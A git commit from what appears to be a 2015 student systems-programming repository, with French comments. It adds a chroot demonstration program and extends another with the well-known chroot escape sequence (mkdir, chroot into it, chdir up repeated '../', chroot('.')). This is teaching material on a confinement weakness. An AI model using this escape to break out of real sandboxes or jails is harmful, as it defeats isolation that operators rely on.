6a0179b03907c64d58db7a10f1be84229ca091ec
AbMaster <abdessabour.arous@outlook.com>
2015-05-25 13:15:56 +0100

    chrootin - chroot out

---
+++ ESPRIT-4CINFO1-Mai-Juin-2015/Divers/chrootin.c
@@ -0,0 +1,45 @@
+// Abdessabour Arous
+//
+//
+// Code repris depuis https://github.com/skuhl/sys-prog-examples/blob/master/simple-examples/chroot.c
+// Merci à Mr Scott A. Kuhl, Associate Professor of Computer Science at Michigan Tech.
+//
+//
+// Démonstration du chroot
+// Usage: ./chroot
+//
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+
+int main(void)
+{
+	char buf[1024];
+	getcwd(buf, 1024);
+	printf("Repertoire current: %s\n", buf);
+	
+	// Lister les fichiers du repertoire current
+	printf("Liste des fichiers dans le repertoire current:\n");
+	execlp("ls", "/", NULL);
+	
+	if(chroot(buf) == -1) // chrooter? /
+	{
+		perror("chroot");
+		printf("Etes vous root?\n");
+		exit(EXIT_FAILURE);
+	}
+	
+	// Reverifier
+	getcwd(buf, 1024);
+	printf("Repertoire current: %s\n", buf);
+	
+	// Lister les fichiers du repertoire current
+	printf("Liste des fichiers dans le repertoire current:\n");
+	execlp("ls", "/", NULL);
+
+}
+}
--- ESPRIT-4CINFO1-Mai-Juin-2015/Divers/chrootout.c
+++ ESPRIT-4CINFO1-Mai-Juin-2015/Divers/chrootout.c
@@ -45,17 +45,28 @@ int main(void)
 		perror("stat(/temoins)");
 	else
 		printf("trouvé /temoins\n");
+	
+	
+	/* Technique de bypass du chroot documentée dans la chroot man page. */
+	printf("Bypass du chroot....\n");
+	mkdir("chroot.temp", 0777);
+	chroot("chroot.temp"); // A l'exterieur du chroot!?!
+	rmdir("chroot.temp"); // nettoyage
 
+	getcwd(buf, 1024);
+	printf("Repertoire current (technique de bypasse 1): %s\n", buf);
+	
+	
 	// Essayer de changer de repertoire vers le racine reel.
 	chdir("../../../../../../../../../../../../../../");
 
 	getcwd(buf, 1024);
-	printf("Repertoire current (technique de bypasse 1): %s\n", buf);
+	printf("Repertoire current (technique de bypasse 2): %s\n", buf);
 
 	// Sommes nous sortie du chroot?
 	chroot(".");
 	getcwd(buf, 1024);
-	printf("Repertoire current (technique de bypasse 2): %s\n", buf);
+	printf("Repertoire current (technique de bypasse 3): %s\n", buf);
 
 	// Lister les fichiers pour vérifier que nous sommes plus à l'intérieur du chroot
 	// out.
